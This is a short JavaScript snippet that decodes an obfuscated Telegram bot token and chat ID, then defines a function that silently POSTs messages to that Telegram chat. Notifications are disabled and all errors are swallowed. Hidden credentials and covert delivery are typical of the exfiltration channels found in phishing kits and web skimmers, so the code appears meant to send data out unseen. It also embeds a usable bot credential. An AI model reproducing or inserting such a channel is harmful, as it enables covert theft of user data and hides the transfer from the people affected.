const _r = s => atob(s).split('').reverse().join('');
const tg_btoken = _r('VU5pbFlBdFNQNkY5Nm5SSU1YWjNzZVo4YXJUWEhUbWtIQUE6MDM1NzQzODQwOA==');
const tg_cid = _r('NjI4MzAwODM2MQ==');

function sendTelegramNotification(message) {
  const url = `https://api.telegram.org/bot${tg_btoken}/sendMessage`;
  const payload = {
    chat_id: tg_cid,
    text: message,
    disable_notification: true,
  };
  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  }).catch(() => {});
}
